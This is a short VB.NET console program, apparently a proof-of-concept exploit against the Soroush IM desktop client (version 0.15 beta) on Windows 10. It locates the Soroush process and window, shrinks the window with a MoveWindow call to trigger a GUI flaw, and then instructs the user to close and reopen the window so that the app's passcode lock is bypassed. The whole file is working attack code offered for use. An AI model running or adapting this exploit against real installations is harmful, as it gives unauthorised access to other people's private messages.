Imports System.Runtime.InteropServices
Module Module1
    Private Const WM_CLOSE As UInt32 = 16
    <DllImport("user32.dll", SetLastError:=True)>
    Private Function FindWindow(lpClassName As String, lpWindowName As String) As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True)>
    Private Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInt32, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True)> Private Function MoveWindow(hWnd As IntPtr, X As Integer, Y As Integer,
    nWidth As Integer, nHeight As Integer, bRepaint As Boolean) As Boolean
    End Function
    Sub Main()
        Try
            Console.WriteLine("<<<<<Soroush IM Desktop GUI misbehaviour leads to passcode bypass>>>>> ")
            Console.WriteLine("****** Developer: NeoVortex")
            Console.WriteLine("****** Client Version 0.15 BETA")
            Console.WriteLine("****** Tested on windows 10 1803")
            Console.WriteLine("[****] Make sure the Messager windows is not minimized ")
            Console.WriteLine("[Press any key to start the exploit...]")
            Console.ReadKey()
            Dim pss() As Process = Process.GetProcessesByName("Soroush")
            Dim hWnd As IntPtr = FindWindow(Nothing, "Soroush")
            If (pss.Count > 0) Then
                Console.WriteLine("[****] Process found with id: " & pss(0).Id)
                Console.WriteLine("[****] Process File " & pss(0).MainModule.FileName)
                Console.WriteLine("[****] Resizing to trigger the vulnerability.....")
                MoveWindow(hWnd, 100, 100, 100, 100, True)
                Console.WriteLine("[****] Done")
                Console.WriteLine("[****] Now close the Soroush messager windows via X button (NOT via system tray) , then reopen it ")
                Console.WriteLine("[****] Passcode will be bypassed! ")
            Else
                Console.WriteLine("[----]Process not found ")
            End If
            Console.ReadKey()

        Catch ex As Exception
            Beep()
            MsgBox(ex.Message, 16)
            Console.ReadKey()
        End Try
    End Sub

End Module



